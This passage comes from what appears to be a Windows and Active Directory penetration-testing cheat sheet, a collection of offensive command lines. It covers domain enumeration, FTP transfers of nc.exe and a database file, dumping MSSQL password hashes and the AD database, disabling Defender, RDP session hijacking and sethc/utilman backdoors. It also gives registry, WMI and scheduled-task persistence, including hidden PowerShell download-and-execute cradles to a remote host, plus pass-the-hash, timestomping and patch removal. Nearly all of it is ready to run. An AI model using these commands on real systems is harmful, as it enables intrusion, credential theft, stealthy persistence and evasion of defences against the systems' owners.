reg query \"HKEY_LOCAL_MACHINE SOFTWAREMicrosoftWindows CurrentVersionGroup Policy History\" /v DCName or 1 Import-Module ActiveDirectory; (Get-ADDomainController -DomainName corp.test.com -Discover -NextClosestSite).HostName or 1 set l Get list of DCs 1 nltest /dclist:domainname or 1 netdom query /D:domin DC or 1 dsquery server or 1 nslookup -type=srv _ldap._tcp.dc._msdcs.corp.test.com Get DC Info 1 nltest /dsgetdc:domain Get DC site mapping 1 nltest /dsaddresstosite:dcname.corp.test.com Get PDC 1 netdom query /D:domain PDC or 1 nslookup -type=srv _ldap._tcp.pdc._msdcs.corp.test.com or get roles Get Roles 1 netdom query /D:domain FSMO View the list of domain users: 1 2 3 4 C:> wmic useraccount where (domain='%USERDOMAIN%') get Name > userlist.txt PS C:> ([adsisearcher]\"objectCategory=User\").Findall() | ForEach { $_.properties.samaccountname } | Sort | Out-File -Encoding ASCII users.txt or 1 net user /domain Get domain info (including DC) 1 gpresult /z View the list of domain admins: 1 net group \"Domain Admins\" /domain View domain groups 1 2 net group /domain powershell (new-object system.directoryservices.directorysearcher(\"(&amp;(objectcategory=user)(samaccountname=$($env:username)))\")).FindOne().GetDirectoryEntry().memberof View the list of started services (search for antivirus): 1 2 net start sc query Stop a service: 1 net stop \"Symantec Endpoint Protection\" View the list of started processes and the owner: 1 tasklist /v Kill a process by its name: 1 taskkill /F /IM \"cmd.exe\" Abort a shutdown/restart countdown: 1 shutdown /a Download an executable from a remote FTP server: 1 2 3 4 5 6 echo open 10.1.2.3> C:script.txt echo user myftpuser>> C:script.txt echo pass myftppass>> C:script.txt echo get nc.exe>> C:script.txt echo bye>> C:script.txt ftp -s:script.txt Upload a file to a remote FTP server: 1 2 3 4 5 6 echo open 10.1.2.3> C:script.txt echo user myftpuser>> C:script.txt echo pass myftppass>> C:script.txt echo put E:backupsdatabase.dbf>> C:script.txt echo bye>> C:script.txt ftp -s:script.txt WMI call remote system 1 wmic / node : remote_computer process call create \"netstat.exe -ano &gt; C:output.txt\" View established connections of current machine: 1 netstat -a -n -p tcp | find \"ESTAB\" View open ports of current machine: 1 2 3 netstat -a -n -p tcp | find \"LISTEN\" netstat -a -n -p udp View network configuration: 1 2 3 netsh interface ip show addresses netsh interface ip show route netsh interface ip show neighbors View current network shares: 1 net share Mount a remote share with the rights of the current user: 1 net use K: \\10.1.2.3C$ Enable Remote Desktop: 1 reg add \"HKLMSystemCurrentControlSetControlTerminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f One-Liner Windows Enumeration Reference: https://gist.github.com/KyleHanslovan/cadf9737401b85422c84091855473eb7 1 whoami &amp; hostname &amp; ipconfig /all &amp; net user /domain 2&gt;&amp;1 &amp; net group /domain 2&gt;&amp;1 &amp; net group \"domain admins\" /domain 2&gt;&amp;1 &amp; net group \"Exchange Trusted Subsystem\" /domain 2&gt;&amp;1 &amp; net accounts /domain 2&gt;&amp;1 &amp; net user 2&gt;&amp;1 &amp; net localgroup administrators 2&gt;&amp;1 &amp; netstat -an 2&gt;&amp;1 &amp; tasklist 2&gt;&amp;1 &amp; sc query 2&gt;&amp;1 &amp; systeminfo 2&gt;&amp;1 &amp; reg query \"HKEY_CURRENT_USERSoftwareMicrosoftTerminal Server ClientDefault\" 2&gt;&amp;1 &amp; net view &amp; net view /domain &amp; net user %USERNAME% /domain &amp; nltest /dclist &amp; gpresult /z Check for unquoted service paths 1 wmic service get name,displayname,pathname,startmode | findstr /i /v \"c:windows\\\" | findstr /i /v \"\"\" or 1 gwmi win32_service |Select pathname | Where {($_.pathname -ne $null)} | Where {-not $_.pathname.StartsWith(\"`\"\")} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(\".\") +4)) -match \".* .*\"} Change Windows Proxy Settings Command to enable proxy usage: 1 reg add \"HKCUSoftwareMicrosoftWindowsCurrentVersionInternet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f Command to disable proxy usage: 1 reg add \"HKCUSoftwareMicrosoftWindowsCurrentVersionInternet Settings\" /v ProxyEnable /t REG_DWORD /d 0 /f Command to change the proxy address: 1 reg add \"HKCUSoftwareMicrosoftWindowsCurrentVersionInternet Settings\" /v ProxyServer /t REG_SZ /d proxyserveraddress:proxyport /f Also, in this case, it is a per-user setting than a system-wide setting. Mount a .win image remotely on target machine 1 2 3 4 5 6 7 8 9 Dism /get-wiminfo /wimfile:z:win7Acme_Win7.wim Boot Dir Dism /Mount-Wim /WimFile:z:win7Acme_Win7.wim /index:1 /MountDir:C:windowstempoffline C: Drive Dism /Mount-Wim /WimFile:z:win7Acme_Win7.wim /index:2 /MountDir:C:windowstempoffline Dism /UnMount-Wim /MountDir:C:windowstempoffline /discard Check if file is locked 1 @echo off; 2&gt;nul ( &gt;&gt;file.txt echo off) &amp;&amp; (echo not locked) || (echo locked) Lock a file for testing 1 (>&2 pause) >> file.txt","title":"Built-in Commands"},{"location":"blogs/2019/01/penetration-testing-pasties/#dsquery","text":"Get attributes for all Windows hosts in the Domain 1 dsquery * -filter \"(&amp;(objectclass=computer) (objectcategory=computer) (operatingSystem=Windows*))\" -limit 0 |dsget computer -dn -samid -desc -loc &gt;c:windowstempcomputers.log Get attributes for computers in a specific OU 1 dsquery computer -limit 0 |dsget computer -dn -samid -desc -l &gt;c:windowstempout.log Get attributes for users in the specified OU 1 dsquery user -limit 0 |dsget user -dn -samid -display -desc -office -tel -email -title -hmdir -profile -loscr -mustchpwd -canchpwd -pwdneverexpires -disabled Get DC 1 dsquery server -forest or 1 dsquery server -o rdn -forest Get Domain Functional Level 1 dsquery * \"DC=corp,DC=test,DC=com\" -scope base -attr msDS-Behavior-Version ntMixedDomain Get Forest Functional Level 1 dsquery * \"CN=Partitions,CN=Configuration,DC=corp,DC=test,DC=com\" -scope base -attr msDS-Behavior-Version ntMixedDomain","title":"DSQUERY"},{"location":"blogs/2019/01/penetration-testing-pasties/#sqlcmd","text":"List Databases 1 sqlcmd -E -S localhost -Q \"EXEC sp_databases;\" List Tables in Database 1 sqlcmd -E -S localhost -Q \"SELECT * FROM DatabaseName.information_schema.tables;\" -W -w 999 -s\",\" -o \"c:windowstempRecruiterProd_MSCRM_tables.csv\" Retrieve table contents 1 sqlcmd -E -S localhost -d DatabaseName -Q \"SELECT * FROM SystemUserBase;\" -W -w 999 -s\",\" -o \"c:windowstempRecruiterProd_MSCRM_userbase.csv\" Dump MSSQL Password Hashes 1 sqlcmd -E -S localhost -Q \"SELECT name, password_hash FROM master.sys.sql_logins;\"","title":"SQLCMD"},{"location":"blogs/2019/01/penetration-testing-pasties/#ntdsutil","text":"Built-in utility to create backup copy of the AD database 1 ntdsutil \"ac i ntds\" \"ifm\" \"create full c:temp\" q q","title":"NTDSUTIL"},{"location":"blogs/2019/01/penetration-testing-pasties/#applocker","text":"List Applocker's effective policy on the system 1 Get-ApplockerPolicy -Effective","title":"Applocker"},{"location":"blogs/2019/01/penetration-testing-pasties/#windows-defender","text":"Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender) 1 c : program fileswindows defendermpcmdrun . exe \" - RemoveDefinitions - All Set - MpPreference - DisableIOAVProtection $true","title":"Windows Defender"},{"location":"blogs/2019/01/penetration-testing-pasties/#appcmd","text":"Get virtual directories in IIS 1 c : windowssystem32inetsrvappcmd . exe list vdir / text : physicalpath","title":"APPCMD"},{"location":"blogs/2019/01/penetration-testing-pasties/#windows-lateral-movement","text":"RDP Hijacking If you have SYSTEM context on a host, you can assume the RDP sessions of other users without credentials using the tscon.exe command. Gain access to cmd.exe to issue the tscon.exe command over RDP by creating a backdoor with Stickkeys or Utilman. Use scheduled tasks (as SYSTEM) or create a service to execute the desired command. RDP hijacking\u200a\u2014\u200ahow to hijack RDS and RemoteApp sessions transparently to move through an organisation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # View RDP sessions on system your RDP'd to with administrative permissions # Locally quser # Remote quser /server: # Create a service that will swap your SESSIONNAME with the desired disconnected session sc create sesshijack binpath= \"cmd.exe /k tscon 1 /dest:rdp-tcp#XX\" error= \"ignore\" # Start service net start sesshijack or sc start sesshijack Linux to Windows Remoting 1 2 3 4 5 winrm set winrm/config/Service/Auth @{Basic=\"true\"} winrm set winrm/config/Service @{AllowUnencrypted=\"true\"} $cred = Get-Credential Enter-PSSession -ComputerName 'winserver1' -Credential $cred -Authentication Basic PowerShell Remoting over SSH 1 Enter-PSSession -Hostname -Username james -SSHTransport","title":"Windows Lateral Movement"},{"location":"blogs/2019/01/penetration-testing-pasties/#windows-persistence-methods","text":"","title":"Windows Persistence Methods"},{"location":"blogs/2019/01/penetration-testing-pasties/#registry-keys","text":"","title":"Registry Keys"},{"location":"blogs/2019/01/penetration-testing-pasties/#modify-registry-keys","text":"1 2 3 4 5 #Add a key/value reg add \\ /v \"\"\" /t /d #Delete a key/value reg delete \\ /v \"\"","title":"Modify registry keys"},{"location":"blogs/2019/01/penetration-testing-pasties/#userinit-key","text":"This key specifies what program should be launched right after a user logs into Windows. The default program for this key is C:windowssystem32userinit.exe. Userinit.exe is a program that restores your profile, fonts, colors, etc for your user name. It is possible to add further programs that will launch from this key by separating the programs with a comma. 1 2 HKEY_LOCAL_MACHINESoftwareMicrosoftWindows NTCurrentVersionWinlogonUserinit HKLMSoftwareMicrosoftWindows NTCurrentVersionWinlogonUserinit = (REG_SZ) C:windowssystem32userinit.exe,c:windowsbadprogram.exe","title":"Userinit Key"},{"location":"blogs/2019/01/penetration-testing-pasties/#run-key","text":"1 2 3 4 5 6 7 #System Wide HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRunOnce #Current Logged-On User Only HKEY_CURRENT_USERSOFTWAREMicrosoftWindowsCurrentVersionRun HKEY_CURRENT_USERSOFTWAREMicrosoftWindowsCurrentVersionRunOnce","title":"Run Key"},{"location":"blogs/2019/01/penetration-testing-pasties/#list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run","text":"1 HKLMSoftwareMSWindowsNTCurrentVersionImage File Execution Optionsnotepad.exedebugger(REG_SZ = cmd.exe)","title":"List Image File Execution Options (Debugger file executed when the target file is run)"},{"location":"blogs/2019/01/penetration-testing-pasties/#appinit_dlls","text":"Load custom DLLs each time a program runs (If it loads USER32.dll). This is checked by most AV! This value corresponds to files being loaded through the AppInit_DLLs Registry value. The AppInit_DLLs registry value contains a list of dlls that will be loaded when user32.dll is loaded. As most Windows executables use the user32.dll, that means that any DLL that is listed in the AppInit_DLLs registry key will be loaded also. This makes it very difficult to remove the DLL as it will be loaded within multiple processes, some of which can not be stopped without causing system instability. The user32.dll file is also used by processes that are automatically started by the system when you log on. This means that the files loaded in the AppInit_DLLs value will be loaded very early in the Windows startup routine allowing the DLL to hide itself or protect itself before we have access to the system. 1 HKLMSOFTWAREMicrosoftWindowsCurrentVersionWindowsAppInit_DLLs","title":"AppInit_DLLs"},{"location":"blogs/2019/01/penetration-testing-pasties/#no-reboot-sethcutilman-option-using-a-debugger-key","text":"Navigate to HKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Options Make key called \"sethc.exe\" Make a REG_SQ value called \"Debugger\" Assign it \"c:windowssystem32cmd.exe\" as the value Hit SHIFT 5 times and get a shell as nt authoritysystem 1 2 reg add \"\\hostnameHKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe\" /v Debugger /t REG_SZ /d \"c:windowssystem32cmd.exe\" reg add \"\\hostnameHKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Optionsutilman.exe\" /v Debugger /t REG_SZ /d \"c:windowssystem32cmd.exe\" Remove the debugger key 1 2 reg delete \"\\hostnameHKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe\" /f reg delete \"\\hostnameHKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Optionsutilman.exe\" /f","title":"No-reboot sethc/utilman option using a \"debugger\" key"},{"location":"blogs/2019/01/penetration-testing-pasties/#file-storage-locations","text":"","title":"File Storage Locations"},{"location":"blogs/2019/01/penetration-testing-pasties/#startup-folders","text":"1 2 3 4 5 6 7 8 9 10 11 #All Users - Windows XP C:Documents and SettingsAll UsersStart MenuProgramsStartup #All Users - Windows Vista+ C:ProgramDataMicrosoftWindowsStart MenuProgramsStartup #User Profile - Windows XP C:Documents and Settings\\Start MenuProgramsStartup #User Profile - Windows Vista+ C:Users\\AppDataRoamingMicrosoftWindowsStart MenuProgramsStartup","title":"Startup Folders"},{"location":"blogs/2019/01/penetration-testing-pasties/#sethcutilman-replacement","text":"Replace these binaries, may require a reboot to take effect 1 2 %WINDIR%System32sethc.exe %WINDIR%System32utilman.exe Hit shift 5 times = sethc.exe run by SYSTEM Windows key + U = utilman.exe run by SYSTEM","title":"SETHC/UTILMAN Replacement"},{"location":"blogs/2019/01/penetration-testing-pasties/#volume-shadow-copy-restore-points","text":"Windows service that's constantly running \u2013 takes snapshots of system directories Drop Malware -> Create VSC (ReadOnly) -> Delete Malware -> Use WMIC to run VSC of malware Registry Key to Disable Volume Shadow Copy 1 HKLMSystemCurrentControlSetControlBackupRestoreFilesNotToSnapshot","title":"Volume Shadow Copy (Restore Points)"},{"location":"blogs/2019/01/penetration-testing-pasties/#vssadmin-native-windows-utility","text":"vssadmin create command only applies to Server OS (Win2k3,2008) 1 2 3 4 5 vssadmin list shadows vssadmin create shadow /for=C: wmic /node:DC1 /user:DOMAINdomainadminsvc /password:domainadminsvc123 process call create \"cmd /c vssadmin create shadow /for=C mklink /D C:VscAccess \\?GLOBALROOTDeviceHardDiskVolumeShadowCopy1 copy \\?GLOBALROOTDeviceHardDiskVolumeShadowCopy4pathtosomefile e:files","title":"VSSADMIN \u2013 native windows utility"},{"location":"blogs/2019/01/penetration-testing-pasties/#use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy","text":"1 wmic process call create \\.GLOBALROOTDeviceHarddiskVolumeShadowCopy1windowssystem32evil.exe This process will not show the imagename (executable filename) or commandline parameters in the task list. The file cannot be individually deleted from the shadow copy once created. The entire shadow copy must be deleted to remove it. 1 2 root@kali:~# wmis -U DOMAINdomainadminsvc%domainadminsvc123 //ServerName \\?GLOBALROOTDeviceHarddiskVolumeShadowCopy1Windowssystem32evil.exe NTSTATUS: NT_STATUS_OK - Success In Kali Linux you could use the WMIS package to do the same thing: 1 2 wmis -U DOMAINdomainadminsvc%domainadminsvc123 //ServerName \\?GLOBALROOTDeviceHarddiskVolumeShadowCopy1Windowssystem32evil.exe NTSTATUS: NT_STATUS_OK - Success","title":"Use WMIC process call to run an .exe from a Volume Shadow Copy"},{"location":"blogs/2019/01/penetration-testing-pasties/#task-scheduling","text":"","title":"Task Scheduling"},{"location":"blogs/2019/01/penetration-testing-pasties/#at","text":"Executes as system and must be an Admin to run it. Check groups with whoami /groups 1 2 3 4 5 at 13:20 /interactive cmd net user arget /user:Domainuser pass net time arget at arget 13:20 c:tempevil.bat","title":"AT"},{"location":"blogs/2019/01/penetration-testing-pasties/#schtasks","text":"Any user can create a task Schedule a binary to run with arguments on system events 1 2 3 4 5 6 7 8 9 10 11 #On System Startup schtasks /create /TN OfficeUpdaterA /tr \"\"c:evil32.exe\" -k password -n services\" /SC onstart /RU system /RL HIGHEST schtasks /create /TN OfficeUpdaterD /tr \"\"c:Program Filesevil32.exe\" -k password -n services\" /SC onstart /RU system /RL HIGHEST #On User Login schtasks /create /TN OfficeUpdaterB /tr \"\"c:evil32.exe\" -k password -n services\" /SC onlogon schtasks /create /TN OfficeUpdaterE /tr \"\"c:Program Filesevil32.exe\" -k password -n services\" /SC onlogon #On Idle schtasks /create /TN OfficeUpdaterC /tr \"\"c:evil32.exe\" -k password -n services\" /SC onidle /i 30'''' schtasks /create /TN OfficeUpdaterF /tr \"\"c:Program Filesevil32.exe\" -k password -n services\" /SC onidle /i 60 Use the Powershell Web Delivery (Download and Execute) module in Metasploit 'exploitwindowsmiscpsh_web_delivery' 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #(X86) - On User Login schtasks /create /tn OfficeUpdaterA /tr \"c:windowssystem32WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'\" /sc onlogon /ru System #(X86) - On System Start schtasks /create /tn OfficeUpdaterB /tr \"c:windowssystem32WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'\" /sc onstart /ru System #(X86) - On User Idle (30mins) schtasks /create /tn OfficeUpdaterC /tr \"c:windowssystem32WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'\" /sc onidle /i 30 #(X64) - On User Login schtasks /create /tn OfficeUpdaterA /tr \"c:windowssyswow64WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'\" /sc onlogon /ru System #(X64) - On System Start schtasks /create /tn OfficeUpdaterB /tr \"c:windowssyswow64WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'\" /sc onstart /ru System #(X64) - On User Idle (30mins) schtasks /create /tn OfficeUpdaterC /tr \"c:windowssyswow64WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onidle /i 30","title":"SCHTASKS"},{"location":"blogs/2019/01/penetration-testing-pasties/#additional-notes","text":"Scheduled Tasks binary paths CANNOT contain spaces because everything after the first space in the path is considered to be a command-line argument. To workaround this behavior, enclose the /TR path parameter between backslash () AND quotation marks (\"): Delete scheduled task without prompting 1 schtasks /delete /f /TN taskname Detailed scheduled tasks listing 1 schtasks /query /V /FO list View scheduled tasks log (for troubleshooting) 1 2 3 notepad c:windowsschedlgu.txt (Windows XP) notepad c:windowstasksschedlgu.txt (Vista+)","title":"Additional Notes"},{"location":"blogs/2019/01/penetration-testing-pasties/#windows-service","text":"1 2 3 sc query sc create <\\Target(optional)> binPath= type= share start= auto DisplayName= sc delete","title":"Windows Service"},{"location":"blogs/2019/01/penetration-testing-pasties/#dll-hijacking","text":"Order of DLL Loading 1 2 3 4 5 6 1. The directory from which the application is loaded 2. The current directory 3. The system directory, usually C:\\Windows\\System32\\ (The GetSystemDirectory function is called to obtain this directory.) 4. The 16-bit system directory - There is no dedicated function to retrieve the path of this directory, but it is searched as well. 5. The Windows directory. The GetWindowsDirector function is called to obtain this directory. 6. The directories that are listed in the PATH environment variable. Many systems use bginfo (seen it a lot in operational sys). Drop Riched32.dll in the dir with bginfo.exe. Codex. Older list of dlls as well (2010). https://www.exploit-db.com/dll-hijacking-vulnerable-applications/ On Windows 7 there are three executables that could be exploited and associated DLLs listed below 1 2 3 4 5 6 7 8 9 10 11 C : windowsehomeMcx2Prov . exe C : WindowsehomeCRYPTBASE . dll C : windowsSystem32sysprepsysprep . exe C : WindowsSystem32sysprepCRYPTSP . dll C : windowsSystem32sysprepCRYPTBASE . dll C : WindowsSystem32sysprepRpcRtRemote . dll C : WindowsSystem32sysprepUxTheme . dll C : windowsSystem32cliconfg . exe C : WindowsSystem32NTWDBLIB . DLL On Windows 8 there are also three executables that could be exploited and associated DLLs listed below 1 2 3 4 5 6 7 8 9 10 11 C : windowsSystem32sysprepsysprep . exe C : windowsSystem32sysprepCRYPTBASE . dll C : WindowsSystem32Sysprepdwmapi . dll C : WindowsSystem32SysprepSHCORE . dll C : windowsSystem32cliconfg . exe C : WindowsSystem32NTWDBLIB . DLL C : windowsSystem32pwcreator . exe C : WindowsSystem32vds . exe C : WindowsSystem32UReFS . DLL Windows 8.1 there are also three executables that could be exploited and associated DLLs listed below 1 2 3 4 5 6 7 8 9 10 11 12 13 14 C : windowsSystem32sysprepsysprep . exe C : WindowsSystem32SysprepSHCORE . dll C : WindowsSystem32SysprepOLEACC . DLL C : windowsSystem32cliconfg . exe C : WindowsSystem32NTWDBLIB . DLL C : windowsSystem32pwcreator . exe C : WindowsSystem32vds . exe C : Program FilesCommon Filesmicrosoft sharedinkCRYPTBASE . dll C : Program FilesCommon Filesmicrosoft sharedinkCRYPTSP . dll C : Program FilesCommon Filesmicrosoft sharedinkdwmapi . dll C : Program FilesCommon Filesmicrosoft sharedinkUSERENV . dll C : Program FilesCommon Filesmicrosoft sharedinkOLEACC . dll","title":"DLL-Hijacking"},{"location":"blogs/2019/01/penetration-testing-pasties/#linkinfodll-replacement","text":"Windows explorer in older systems loads linkinfo.dll from c:windows over c:windowssystem32 if it exists 1 copy evil.dll c:windowslinkinfo.dll","title":"linkinfo.dll Replacement"},{"location":"blogs/2019/01/penetration-testing-pasties/#wmi-event-persistence-via-powershell","text":"WMI Event persistence explained, you can find a bloated version in powersploit. Three parts to this: * WMI Event Filter * Event Consumer * Filter/Consumer Binding This technique gets you SYSTEM level persistence, requires admin rights to execute. Autoruns doesn't even check for this yet. (doubt any AVs are either) Difficult to detect, Difficult to remove if you dont know what youre doing.","title":"WMI Event Persistence via Powershell"},{"location":"blogs/2019/01/penetration-testing-pasties/#wmi-event-filter","text":"Create an event that checks every 60 seconds for a change in Win32_PerfFormattedData_PerfOS_System. (this is always changing) 1 2 3 4 5 6 7 $EventFilter = ([WMICLASS]\"\\.rootsubscription:__EventFilter\").CreateInstance() $EventFilter.QueryLanguage = \"WQL\" $EventFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325\" $EVentFilter.EventNamespace = \"rootcimv2\" $EventFilter.Name = \"OBVIOUSHACKER\" $Result = $EventFilter.Put() $Filter = $Result.Path http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx","title":"WMI Event Filter"},{"location":"blogs/2019/01/penetration-testing-pasties/#event-consumer","text":"Configure what to execute once the event occurs. Current example is just a ping. 1 2 3 4 5 6 $InstanceConsumer = ([wmiclass]\"\\.rootsubscription:CommandLineEventConsumer\").CreateInstance() $InstanceConsumer.Name = \"OBVIOUSHACKER\" $InstanceConsumer.CommandLineTemplate = \"ping 127.0.0.1 -n 100\" #CMD TO EXECUTE HERE $InstanceConsumer.WorkingDirectory = \"C:\\windows\\system32\" $Result = $InstanceConsumer.Put() $Consumer = $Result.Path http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx","title":"Event Consumer"},{"location":"blogs/2019/01/penetration-testing-pasties/#filterconsumer-binding","text":"This is the object that correlates the Filter with the Consumer. Runs as system as a child of WmiPrvSE.exe under the svchost.exe running Dcom service. 1 2 3 4 $InstanceBinding = ([wmiclass]\"\\.rootsubscription:__FilterToConsumerBinding\").CreateInstance() $InstanceBinding.Filter = $Filter $InstanceBinding.Consumer = $Consumer $Result = $InstanceBinding.Put() http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx","title":"Filter/Consumer Binding"},{"location":"blogs/2019/01/penetration-testing-pasties/#removal","text":"The filter name would change depending on what you call the wmi event on your target (OBVIOUSHACKER shown as the example) 1 2 3 Get-WmiObject __eventFilter -namespace rootsubscription -filter \"name='OBVIOUSHACKER'\"| Remove-WmiObject Get-WmiObject CommandLineEventConsumer -Namespace rootsubscription -filter \"name='OBVIOUSHACKER'\" | Remove-WmiObject Get-WmiObject __FilterToConsumerBinding -Namespace rootsubscription | Where-Object { $_.filter -match 'OBVIOUSHACKER'} | Remove-WmiObject Some more detailed information on the subject http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/","title":"REMOVAL"},{"location":"blogs/2019/01/penetration-testing-pasties/#malicious-outlook-rules","text":"https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/ Ruler https://github.com/sensepost/ruler","title":"Malicious Outlook Rules"},{"location":"blogs/2019/01/penetration-testing-pasties/#windows-remote-management-winrm-psremoting","text":"Listens on 5985/5986 by default and allows interactive shell access over HTTP/S Find by scanning for /wsman and looking for HTTP 402 errors (or use Metasploit module) Metasploit has multiple modules for locating the service and gaining shells over WinRM Connect to a remote host with WinRM from local Windows host 1 2 3 4 5 6 Enable-PSRemoting Set-Item -Path WSMan:localhostClientTrustedHosts * -force or Set-Item -Path WSMan:localhostClientTrustedHosts -value \"\" -Force $cred = Get-Credential Invoke-Command -ComputerName -ScriptBlock { gci c: } -credential $cred","title":"Windows Remote Management (WinRM) / PSRemoting"},{"location":"blogs/2019/01/penetration-testing-pasties/#uninstall-a-patch-to-leave-the-system-vulnerable","text":"1 wusa.exe /uninstall /kb:976932","title":"Uninstall a patch to leave the system vulnerable"},{"location":"blogs/2019/01/penetration-testing-pasties/#create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords","text":"http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html","title":"Create custom DLL for password filters and install on DC to capture changed passwords"},{"location":"blogs/2019/01/penetration-testing-pasties/#application-whitelisting-bypass-techniques","text":"SubTee Collection of Whitelist Bypass Techniques https://bitbucket.org/jsthyer/wevade.git Version .0.0.3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 1. IEExec -This technique may work in certain environments. Its relies on the fact that many organizations trust executables signed by Microsoft. We can misuse this trust by launching a specially crafted .NET application. Example Here: https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/ 2. Rundll32.exe 3. ClickOnce Applications dfsvc.exe dfshim.dll 4. XBAP - XML Browser Applications WPF PresentationHost.exe 5. MD5 Hash Collision http://www.mathstat.dal.ca/~selinger/md5collision/ 6. PowerShell - Specifically Reflective Execution [Reflective DLL Injection with PowerShell][10] https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf 7. .HTA Application Invoke PowerShell Scripts Launched by mshta.exe, bypasses IE security settings as well. 8. bat, vbs, ps1 1. cmd.exe /k < script.txt 2. cscript.exe //E:vbscript script.txt 3. Get-Content script.txt | iex 9. Malicious Troubleshooting packs - MSDT.exe Reference: http://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/ Thanks to @nberthaume, @Killswitch_GUI 10. InstallUtil.exe A signed MS binary that loads assemblies and executes - One of the best. Examples here: https://gist.github.com/subTee 11. Regsvcs/Regasm See: https://gist.github.com/subTee/fb09ef511e592e6f7993 These 2 are Excellent. 12. regsvr32.exe https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302 This one is just simply amazing... regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll 13. Msbuild.exe http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html ``` ## Certutil https://gist.github.com/subTee/7937a8ef07409715f15b84781e180c46 File download ``` certutil -urlcache -split -f http://example.com/file ``` ## Active Directory Enumeration ### Adfind www.joeware.net/freetools/tools/adfind/ ``` AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f \"objectcategory=computer\" > domain_computers.txt AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f \"objectcategory=computer\" distinguishedName dNSHostName description whenchanged operatingSystem operatingSystemVersion > domain_computers_light.txt AdFind.exe -u account@domain.com -up pass -h 10.4.128.40:389 -b dc=domain,dc=com -f \"objectcategory=user\" samaccountname description pwdlastset orclcommonattribute > domain_users_light.txt","title":"Application Whitelisting Bypass Techniques"},{"location":"blogs/2019/01/penetration-testing-pasties/#powershell","text":"List help for cmdlet: Get-Help [cmdlet] -full List available properties and methods: Get-Member For-each loop: ForEach-Object { $_ } Search for string (like grep): Select-String -path [file] -pattern [string] Timestomp 1 2 3 4 5 $ file =( gi c : file . exe ); $ date = '01/03/2009 12:12 pm' ; $ file . LastWriteTime =$ date ; $ file . LastAccessTime =$ date ; $ file . CreationTime =$ date Show last system boot time 1 Get-WmiObject win32_operatingsystem | select csname, @ { LABEL = 'LastBootUpTime' ; EXPRESSION = { $_.ConverttoDateTime ( $_.lastbootuptime ) }} Wrap binary execution in a powershell loop 1 powershell foreach ($ target in ( get-content c : usersusernameappdatalocaltemphosts_da_loggedin_unique . txt )) { \" [ * ] $ Target : \" ; ( c : programdatasd . exe ./ administrator @ $ target - hashes aad3b435b51404eeaad3b435b51404ee : a4bab1c7d4bef62d4c22043ddbf1312c ) } ` Download a file 1 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } ;(new-object system.net.webclient).downloadfile(\"https://www.mydomain.com/file\",\"C:UsersusernameAppDataLocalTempfile.txt\") Encode string 1 echo \"iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')\" | iconv --to-code UTF-16LE | base64 -w 0 List recently modified files in path (U:) 1 Get-Childitem u: -Recurse | where-object {!($_.psiscontainer)} | where { $_.LastWriteTime -gt $(Get-Date).AddDays(-1) } | foreach {\"$($_.LastWriteTime) :: $($_.Fullname) \" } List Files 1 Select-String -Path c:fso*.txt, c:fso*.log -pattern ed List First 100 Files 1 Get-ChildItem -Path XXX |Select -First 100 Fullname List a Process's Loaded Modules (DLL) 1 get-process -id 1234|select -expand modules Remote Command Execution using MMC 1 